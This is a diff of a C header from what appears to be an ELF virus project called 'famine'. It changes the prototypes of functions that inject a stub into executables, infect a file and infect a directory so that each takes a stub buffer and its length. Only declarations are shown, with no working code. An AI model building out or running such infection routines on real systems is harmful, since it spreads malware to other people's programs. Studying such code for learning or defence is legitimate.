@@ -15,6 +15,7 @@
 # include <sys/stat.h>
 # include <unistd.h>
 # include <limits.h>
+# include "./m_std.h"
 
 # if DEBUG
 #  include <stdio.h>
@@ -71,10 +72,10 @@ int			is_valid_elf(const Elf64_Ehdr *elf, off_t size);
 int			find_segments(t_famine *f);
 uint64_t	highest_vaddr_end(const t_famine *f);
 
-void		inject_stub(t_famine *f);
+void		inject_stub(t_famine *f, const unsigned char *stub, size_t stub_len);
 
-int			infect_file(const char *path);
+int			infect_file(const char *path, const unsigned char *stub, size_t stub_len);
 
-void		infect_dir(const char *dir);
+void		infect_dir(const char *dir, const unsigned char *stub, size_t stub_len);
 
 #endif
